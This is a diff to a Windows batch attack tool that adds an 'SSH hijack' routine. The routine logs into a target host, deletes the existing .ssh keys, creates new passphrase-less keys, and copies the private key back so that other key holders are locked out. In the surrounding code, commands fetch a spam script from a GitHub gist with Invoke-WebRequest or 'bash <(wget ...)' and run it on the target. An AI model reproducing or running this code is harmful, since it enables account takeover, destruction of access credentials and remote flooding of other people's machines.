@@ -1846,6 +1846,22 @@ if %monitoring%==0 set "monitoring-status=Disabled"
     call :sys.verify.execution
     cls
 
+:ssh.hijack
+setlocal enabledelayedexpansion
+    echo Should the SSH-Keys be regenerated?
+    echo This will prohibit anyone with the Old Keys from Accessing the Target
+    echo.
+    echo [1] Yes
+    echo.
+    echo [2] No
+    echo.
+    echo.
+    choice /C 12 /M "Choose an option from above:"
+        set _erl=%errorlevel%
+        if %_erl%==1 set "ssh.regen=1" && goto ssh.start.spam
+        if %_erl%==2 set "ssh.regen=0" && goto ssh.start.spam
+    goto ssh.hijack
+
 :ssh.start.spam
 setlocal enabledelayedexpansion
     echo Is the SSH Host running Windows or Linux?
@@ -1864,6 +1880,26 @@ setlocal enabledelayedexpansion
 
 :spam.ssh.target.win
     if defined logging call :log Spamming_Windows_SSH_Target
+
+    if "%ssh.regen%"=="1" (
+        echo Regenerating SSH keys on target...
+        rem Generate New Keys
+        if defined ssh-key (
+            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
+        ) else (
+            ssh %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
+        )
+        if errorlevel 1 (
+            echo [ERROR] SSH key regeneration failed!
+            goto ssh.done
+        )
+        echo New SSH private key generated and saved to new_ssh_key.txt:
+        type new_ssh_key.txt 
+        type new_ssh_key.txt | clip
+        rem Update the ssh-key variable to use the new key for the following connection
+        set "ssh-key=new_ssh_key.txt"
+    )
+
     set "ssh_command=%powershell.short% -Command \"& { Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'cmd.exe' -ArgumentList '/c spam.bat %ssh_filecount%' }\""
 
     echo Connecting to Windows SSH target...
@@ -1881,8 +1917,28 @@ setlocal enabledelayedexpansion
     echo Successfully executed SSH connection.
     goto ssh.done
 
+
 :spam.ssh.target.lx
     if defined logging call :log Spamming_Linux_SSH_Target 
+    if "%ssh.regen%"=="1" (
+        echo Regenerating SSH keys on target...
+        rem Generate New Keys
+        if defined ssh-key (
+            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
+        ) else (
+            ssh %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
+        )
+        if errorlevel 1 (
+            echo [ERROR] SSH key regeneration failed!
+            goto ssh.done
+        )
+        echo New SSH private key generated and saved to new_ssh_key.txt:
+        type new_ssh_key.txt
+        type new_ssh_key.txt | clip
+        rem Update the ssh-key variable to use the new key for subsequent connections
+        set "ssh-key=new_ssh_key.txt"
+    )
+
     set "ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%"
     
     echo Connecting to SSH target...
@@ -1896,6 +1952,7 @@ setlocal enabledelayedexpansion
         echo [ERROR] SSH connection failed!
         goto ssh.done
     )
+
     echo Successfully executed SSH connection.
     goto ssh.done
 
